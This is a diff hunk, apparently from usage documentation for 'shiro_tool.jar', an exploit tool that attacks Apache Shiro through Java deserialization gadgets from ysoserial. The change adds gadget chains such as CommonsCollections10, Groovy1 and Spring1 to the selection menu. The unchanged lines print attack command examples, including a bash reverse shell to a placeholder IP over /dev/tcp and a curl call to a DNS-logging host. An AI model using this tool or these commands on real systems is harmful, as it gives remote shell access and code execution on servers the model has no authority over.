@@ -30,10 +30,13 @@
 [*] JRMPClient please use: java -cp shiro_tool.jar ysoserial.exploit.JRMPListener 
 0: URLDNS
 1: CommonsBeanutils1
-2: JSON1
-3: JRMPClient
-[-] please enter the number(0-3)
-2
+2: CommonsCollections10
+3: Groovy1
+4: JSON1
+5: Spring1
+6: JRMPClient
+[-] please enter the number(0-6)
+4
 [-] use gadget: JSON1
 [*] command example: bash -i >& /dev/tcp/xx.xx.xx.xx/80 0>&1
 [*] command example: curl dnslog.xx.com
